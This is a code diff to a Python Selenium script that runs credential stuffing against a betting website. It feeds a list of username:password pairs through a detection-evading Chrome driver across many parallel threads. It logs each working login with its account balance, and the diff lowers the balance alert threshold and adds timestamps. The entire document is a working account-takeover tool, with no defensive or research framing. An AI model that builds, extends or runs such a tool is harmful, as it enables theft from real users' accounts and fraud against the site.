@@ -5,6 +5,7 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+from datetime import datetime
 import undetected_chromedriver as uc
 import time
 import traceback
@@ -14,6 +15,7 @@ import threading
 import keyboard  # for detecting keypresses
 import sys
 
+
 stop_flag = False
 
 def emergency_stop_listener():
@@ -22,12 +24,12 @@ def emergency_stop_listener():
 
     while True:
         event = keyboard.read_event()
-        if event.event_type == keyboard.KEY_DOWN and event.name == 's':
+        if event.event_type == keyboard.KEY_DOWN and event.name == 'i':
             buffer.append(time.time())
             # Remove keypresses older than 3 seconds
             buffer = [t for t in buffer if time.time() - t < 3]
             if len(buffer) >= 5:
-                print("\n[EMERGENCY STOP] 's' pressed 5 times. Stopping script.")
+                print("\n[EMERGENCY STOP] 'i' pressed 5 times. Stopping script.")
                 stop_flag = True
                 os._exit(0)  # Force quit entire script including threads
 
@@ -51,7 +53,7 @@ def init_driver(block_images=True):
         prefs = {"profile.managed_default_content_settings.images": 2}
         options.add_experimental_option("prefs", prefs)
 
-    version_main = 137
+    version_main = 139
 
     driver = uc.Chrome(options=options, version_main=version_main)
     driver.set_window_size(1920, 1080)  # Important for rendering layout in headless mode
@@ -158,8 +160,8 @@ def login(credentials):
         # Convert to float/int for comparison
         balance_value = float(formatted_amount.replace(',', '.'))
 
-        # Play sound if balance > 9.99
-        if balance_value > 9.99:
+        # Play sound if balance > 0.99
+        if balance_value > 0.99:
             try:
                 winsound.PlaySound(r"C:\Users\petar\Desktop\inbet\minet.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)
             except:
@@ -167,8 +169,9 @@ def login(credentials):
 
         # Log only if balance
         if balance_found:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             with open(success_logins_file, 'a', encoding='utf-8') as file:
-                file.write(f"{username}:{password} - Balance: {formatted_amount}\n")
+                file.write(f"[{timestamp}] {username}:{password} - Balance: {formatted_amount}\n")
 
     except Exception as e:
         traceback.print_exc()
@@ -180,7 +183,7 @@ def main():
     global login_page_url, success_logins_file, stop_flag
 
     credentials_file = 'credentials.txt'
-    success_logins_file = r"C:\Users\petar\Desktop\inbet\balance_and_bets_sounds.txt"
+    success_logins_file = r"C:\Users\petar\Desktop\inbet\motherfucker.txt"
     os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)
 
     login_page_url = "https://www.inbet.com/sports"
@@ -189,7 +192,7 @@ def main():
     listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
     listener_thread.start()
 
-    max_workers = 17
+    max_workers = 15
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         executor.map(login, credentials)
 
